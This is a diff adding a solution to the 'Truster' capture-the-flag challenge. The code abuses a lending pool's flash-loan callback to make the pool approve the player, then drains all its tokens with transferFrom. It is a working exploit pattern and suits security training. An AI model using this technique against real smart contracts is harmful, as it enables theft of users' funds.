@@ -22,7 +22,22 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /* 
+            We can take a 0 token loan from the pool and pass data to make an unsafe low-level call to DVT contract
+            In this unsafe low-level call to DVT contract we will approve player to spend all funds
+            Immediately after, we will use our allowance to drain all tokens using transferFrom function.
+        */
+        
+        let ABI = ["function approve(address to, uint256 amount)"];
+        let iface = new ethers.utils.Interface(ABI);
+        const data = iface.encodeFunctionData("approve", [
+            player.address,
+            TOKENS_IN_POOL,
+        ]);
+        await pool.flashLoan(0, player.address, token.address, data);
+        await token
+        .connect(player)
+        .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
